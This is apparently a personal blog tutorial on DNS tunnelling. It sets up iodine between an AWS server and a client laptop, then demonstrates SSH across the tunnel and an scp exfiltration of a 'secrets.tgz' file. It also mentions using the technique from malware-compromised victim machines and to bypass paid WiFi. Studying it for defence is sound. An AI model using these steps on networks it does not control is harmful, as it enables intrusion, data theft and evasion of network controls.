Introduction
---
Okay, so let me preface this with some potential legality concerns.  Yes this
might be considered as cracking however I remind all that laws around computer
hacking are centrered around unlawful access to a computer system, stealing,
defacing or otherwise manipulating data of which you have no authority to do so
and finally causing disruption or loss of earning through your actions.
Connecting to an open WiFi network and making DNS requests which are allowed to
be performed against DNS servers of your own does not come under these laws.

**I.E. All servers and networks used in this blog are my own (or I have permission to use).**

So, legal spiel aside... Let's get on with my first real engineering blog in a
while!

What's a DNS tunnel
---
Without getting to much into it i'll first try to give a simple overview of what
DNS and tunneling are and how they are used, then explain how we can combine
the two into what is known as a DNS tunnel.

DNS
---
Stands for 'domain name system' and is a fundamental service in IT.  Essentially
turning bbc.co.uk into an IP address.  We can use tools like `nslookup` or
my favorite `dig` to perform _DNS lookups_ manually. E.G.

```
Bens-MacBook-Pro-2:~ ben$ dig bbc.co.uk

; <<>> DiG 9.9.7-P3 <<>> bbc.co.uk
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 44516
;; flags: qr rd ra; QUERY: 1, ANSWER: 4, AUTHORITY: 0, ADDITIONAL: 0

;; QUESTION SECTION:
;bbc.co.uk.			IN	A

;; ANSWER SECTION:
bbc.co.uk.		253	IN	A	212.58.246.79
bbc.co.uk.		253	IN	A	212.58.246.78
bbc.co.uk.		253	IN	A	212.58.244.22
bbc.co.uk.		253	IN	A	212.58.244.23

;; Query time: 10 msec
;; SERVER: 8.8.8.8#53(8.8.8.8)
;; WHEN: Wed Oct 04 22:28:24 BST 2017
;; MSG SIZE  rcvd: 91
```
We can see in the output of `dig` that the _nameserver_ (8.8.8.8)
responded to our query with 4 IP addresses for the domain bbc.co.uk.
I'll spare the explanation of why BBC has 4 IP addresses and why they are in
different subnets as this is beyond the scope of this blog/tutorial.  For our
purposes just take in that we requested an answer to a query "Where is bbc.co.uk?"
and the server responded with a list of 4 IP addresses.  Our computers (web browsers)
would then use this information to connect to bbc.co.uk and transfer the content
over the internet to your machine.

Tunnels
---
Be they SSH, DNS, SOCKS, etc. etc. Basically all protocols can be tunneled through
another protocol.  This allows creative types to obfuscate or hide their internet
traffic in another protocol.  This is incredibly useful to the more nefarious types
that live on the internet and can be used for network infiltration, data exfiltration
obfuscation of activities and even with a bit of work
(which will be detailed in this blog) used to create encrypted SSH lines into
pretty tightly controlled networks.

DNS tunnels
---
So combining the two, if we have a network which allows users to make DNS requests
to the public (root) nameservers we can exploit this into gaining full unfettered
internet connection.  This is typical of certain "Open, but paid for"
WiFi access points found in many coffee shops, airports, trains and various other
public places.  The DNS requests are required for their "Please give us £££ for 2
mins of internet time" pages to be able to be served to you.  Do note, this is
not always the case, but you will be surprised how many access points this is
the case for.  It is also worth noting that many business networks are also setup
in a similar manner e.g. if a client in the network makes a DNS query to the internal
DNS servers and they do not know the answer, they will simply recurse up to the next
nameserver (usually a public one on the internet).  This is the attack surface many
crackers will use to gain illicit access to a companies internal network.

A working example
---
I never leave my readers un-prepared, so here is how you can setup and operate your
own DNS tunnel.  

You will need a few things first:
* A "server" connected to the internet. This could be:
    * A computer at home
    * AWS EC2 instance
    * Anything with a full un-restricted internet connection basically
* A "client" in the restricted network you need to tunnel out of
    * Compromised node within a victims network (usually compromised through a piece of malware in an email.  This malware then sets up the tunnel inside the network and you sit on the other end of the tunnel waiting for the victim to open the attachment)
    * You own laptop in a network which allows DNS requests, but not HTTP/HTTPS (and you want it)
* A DNS domain which you have control over.
    * This is not totally required and there are ways around it however it makes it _much_ easier
* Some open source software available on [Github](https://github.com)

For the purpose of this blog / light tutorial I will be using an AWS EC2 instance
as the "Server", my laptop as the "Client", Amazons Route 53 service as my DNS
domain under my control and finally [Iodine](https://github.com/yarrick/iodine)
as the tunnel setup software.

Also note the setup is best done ahead of time, as it will take a bit of SSHing
into the server and out to the client etc.

Putting it all together
---
First of all we should setup the "Server" end of the tunnel. This is a machine
which is completely under your control (you have root on) and has completely un-restricted
internet access.  So for this tutorial I will spin up a Centos 7.2 Linux machine
in Amazons Elastic Compute (EC2) service.  Also, ensure it starts with a public facing
IP address... Once the machine is running simply give it a full update (optional)
and then download and compile iodine on it.
```
sudo su -
git clone https://github.com/yarrick/iodine.git
cd iodine
make                                              
```
This will download the iodine sources from github and compile them on the server.
We can leave this for the time being, lets go setup the DNS.

In Amazons R53 console, I own my own domain (westys.net) so I'll just use this
for this test.  So lets create a DNS _CNAME_ and a _NS_ record for my server.  

![dns records](/assets/img/dtun/dns.png)

That's all we need to do in terms of DNS setup.  This will take a few minutes
to propagate up to the root nameservers so wait a bit... then let's start the
iodined (or server end of the DNS tunnel).

```
ssh iod.westys.net
iodined -c 10.0.0.1 dtun.westys.net
```

`-c` simply disables client IP address checking (useful if you don't know where the client will come from)
The first argument is the IP address you want the server end of the tunnel to have
(this is arbitrary) and the second is the DNS sub-domain you have setup DNS to
forward DNS requests to for this domain.

All we need on the client is the 'iodine' binary (which was compiled in step 1).
Either copy the binary onto your client (or make use of base64 and DNS TXT records) to get
the binary onto your machine.  Once it's there it is simply a case of running the
binary with the name of your _NS_ record as it's only argument E.G.
```
./iodine dtun.westys.net
```
This will setup a new point-to-point interface on the client
(usually one IP up from the servers, 10.0.0.2 in our example) which can then be used
to connect to the server and vice-versa... E.G.
```
root@localhost bin]# ./iodine dtun.westys.net
Enter password:
Opened dns0
Opened IPv4 UDP socket
Sending DNS queries for dtun.westys.net to 10.0.2.3
Autodetecting DNS query type (use -T to override).
Using DNS type NULL queries
Version ok, both using protocol v 0x00000502. You are user #1
Setting IP of dns0 to 10.0.0.3
Setting MTU of dns0 to 1130
Server tunnel IP is 10.0.0.1
Testing raw UDP data to the server (skip with -r)
Server is at 192.168.0.61, trying raw login: ....failed
Using EDNS0 extension
DNS queries get changed to lowercase, keeping upstream codec Base32
No alternative downstream codec available, using default (Raw)
Switching to lazy mode for low-latency
Server switched to lazy mode
Autoprobing max downstream fragment size... (skip with -m fragsize)
768 ok.. 1152 ok.. ...1344 not ok.. ...1248 not ok.. ...1200 not ok.. 1176 ok.. 1188 ok.. will use 1188-2=1186
Setting downstream fragment size to max 1186...
Connection setup complete, transmitting data.
Detaching from terminal...
```
We have now setup a full DNS tunnel. So let's experiment:
```
# On the "server" SSH into the "client"
[root@ip-192-168-0-61 ~]# ssh -l vagrant 10.0.0.2
vagrant@10.0.0.2's password:
Last login: Wed Oct  4 22:56:35 2017 from 10.0.2.2
[vagrant@localhost ~]$
```
Oh S*&@!!!

```
# On the "client" SSH out to the "server" in AWS...
vagrant@localhost bin]# ssh -l centos -i ~/.ssh/iod -l centos 10.0.0.1
Last login: Wed Oct  4 22:59:12 2017 from 213.210.61.225
[centos@ip-192-168-0-61 ~]$
```
This ain't good....

```
# Client data exfiltration
vagrant@localhost ~]$ scp -i /tmp/iod /tmp/secrets.tgz centos@10.0.0.1:~
secrets.tgz                                     100%    0     0.0KB/s   00:00    
[vagrant@localhost ~]$

```
We're totally screwed now...

Conclusion
---
This is a very real, almost un-mitigated attack vector for business.  
A recent conference lecture at [IPEXPO](http://www.ipexpoeurope.com/) I attended surmised
that 91% of all attacks on business networks today used DNS exploits like this in some capacity.  
While only 1/3 of companies perform any kind of mitigation against such an attack.  
Yes this was all in the name of fun here but it isn't always the case!

As we can see, it is trivial to setup and gain a full, encrypted, bi-directional
stream between attacker and victim, yes it's slow (slower than dial up!) however
it _does_ exist and it _can_ be exploited by persons that are not pen testers or
crackers.  So let's get to plugging these holes up and monitor our DNS traffic
before it's too late!
